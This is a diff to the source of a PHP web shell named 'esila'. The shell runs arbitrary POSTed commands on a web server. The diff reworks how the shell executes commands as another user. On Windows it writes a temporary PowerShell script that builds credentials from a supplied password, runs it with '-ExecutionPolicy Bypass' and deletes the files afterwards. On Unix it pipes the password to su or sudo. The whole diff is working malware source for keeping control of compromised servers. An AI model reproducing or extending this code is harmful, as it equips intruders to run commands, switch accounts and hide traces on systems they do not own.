@@ -23,6 +23,9 @@ define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
 define('VERSION', '2.4');
 
+// PowerShell-safe single-quote escaping for .ps1 scripts
+function ps_quote($s) { return "'" . str_replace("'", "''", $s) . "'"; }
+
 // Universal command execution - tries multiple methods
 function esila_exec($cmd) {
     $out = '';
@@ -245,11 +248,17 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
     }
     if (IS_WIN) {
         $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
-        $tmpf = $tmp . '\\esila_su_' . mt_rand(1000,9999) . '.txt';
-        $ps_pass = str_replace("'", "''", $su_pass);
-        $ps_user = str_replace("'", "''", $su_user);
-        $ps_tmpf = str_replace("'", "''", $tmpf);
-        $test = esila_exec("powershell -c \"\\$p=ConvertTo-SecureString '$ps_pass' -AsPlainText -Force;\\$c=New-Object System.Management.Automation.PSCredential('$ps_user',\\$p);Start-Process cmd -Credential \\$c -ArgumentList '/c whoami' -NoNewWindow -Wait -RedirectStandardOutput '$ps_tmpf' 2>&1;Get-Content '$ps_tmpf';Remove-Item '$ps_tmpf' -Force\" 2>&1");
+        $rid = mt_rand(10000,99999);
+        $tmpf = $tmp . '\\esila_su_' . $rid . '.txt';
+        $ps1 = $tmp . '\\esila_su_' . $rid . '.ps1';
+        $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+            . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
+            . 'Start-Process cmd -Credential $c -ArgumentList "/c whoami" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($tmpf) . "\r\n"
+            . 'Get-Content ' . ps_quote($tmpf) . "\r\n"
+            . 'Remove-Item ' . ps_quote($tmpf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+        @file_put_contents($ps1, $ps_script);
+        $test = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
+        @unlink($ps1);
     } else {
         $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
         if (strpos($test, $su_user) === false) {
@@ -296,15 +305,18 @@ if (isset($_POST['cmd'])) {
     if ($su_user !== '') {
         if (IS_WIN) {
             $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
-            $r = mt_rand(1000,9999);
+            $r = mt_rand(10000,99999);
             $outf = $tmp . '\\esila_o' . $r . '.txt';
             $errf = $tmp . '\\esila_e' . $r . '.txt';
-            $ps_pass = str_replace("'", "''", $su_pass);
-            $ps_user = str_replace("'", "''", $su_user);
-            $ps_outf = str_replace("'", "''", $outf);
-            $ps_errf = str_replace("'", "''", $errf);
-            $ps_cmd = str_replace("'", "''", $basecmd);
-            $exec = "powershell -c \"\\$p=ConvertTo-SecureString '$ps_pass' -AsPlainText -Force;\\$c=New-Object System.Management.Automation.PSCredential('$ps_user',\\$p);Start-Process cmd -Credential \\$c -ArgumentList '/c $ps_cmd' -NoNewWindow -Wait -RedirectStandardOutput '$ps_outf' -RedirectStandardError '$ps_errf';Get-Content '$ps_outf','$ps_errf';Remove-Item '$ps_outf','$ps_errf' -Force -ErrorAction SilentlyContinue\" 2>&1";
+            $ps1 = $tmp . '\\esila_r' . $r . '.ps1';
+            $cmd_esc = str_replace('"', '`"', $basecmd);
+            $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+                . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
+                . 'Start-Process cmd -Credential $c -ArgumentList "/c ' . $cmd_esc . '" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($outf) . ' -RedirectStandardError ' . ps_quote($errf) . "\r\n"
+                . 'Get-Content ' . ps_quote($outf) . ', ' . ps_quote($errf) . "\r\n"
+                . 'Remove-Item ' . ps_quote($outf) . ', ' . ps_quote($errf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+            @file_put_contents($ps1, $ps_script);
+            $exec = 'powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1';
         } else {
             $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
         }
